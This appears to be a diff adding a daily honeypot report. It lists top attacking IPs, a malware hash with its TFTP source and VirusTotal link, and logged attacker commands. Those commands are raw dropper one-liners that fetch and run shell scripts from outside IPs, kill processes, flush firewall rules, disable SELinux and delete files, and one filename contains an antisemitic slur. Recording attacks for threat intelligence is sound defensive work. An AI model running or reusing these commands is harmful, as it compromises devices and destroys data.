@@ -1,0 +1,20 @@
+Top 5 IPs for 2024-01-11:
+
+138.197.169.243
+182.56.209.169
+95.179.125.247
+118.33.118.122
+116.95.33.220
+
+Malware downloaded:
+a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+Download from : tftp://117.94.212.102/.i
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://141.98.7.3/ad.sh; sh ad.sh; curl http://141.98.11.208/ad.sh; sh ad.sh
+cd /data/local/tmp/; rm *.nn;busybox wget http://141.98.7.3/ad.sh;chmod 777 ad.sh;sh ad.sh
+cd /data/local/tmp/;busybox wget http://103.245.236.188/w.sh; sh w.sh; curl http://103.245.236.188/c.sh; sh c.sh; wget http://103.245.236.188/wget.sh; sh wget.sh; curl http://103.245.236.188/wget.sh; sh wget.sh; busybox wget http://103.245.236.188/wget.sh; sh wget.sh; busybox curl http://103.245.236.188/wget.sh; sh wget.sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.123.85.79/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 93.123.85.79 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 93.123.85.79; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+kill -9 $(ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(adbshell)/ && $2 > 15 && $1 != '$$' {print $1}');pkill -9 -;pkill -9 arm;pkill -9 arm7; pkill -9 x86;pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;su 0 iptables -F;setenforce 0;busybox wget http://103.72.57.195/and;chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
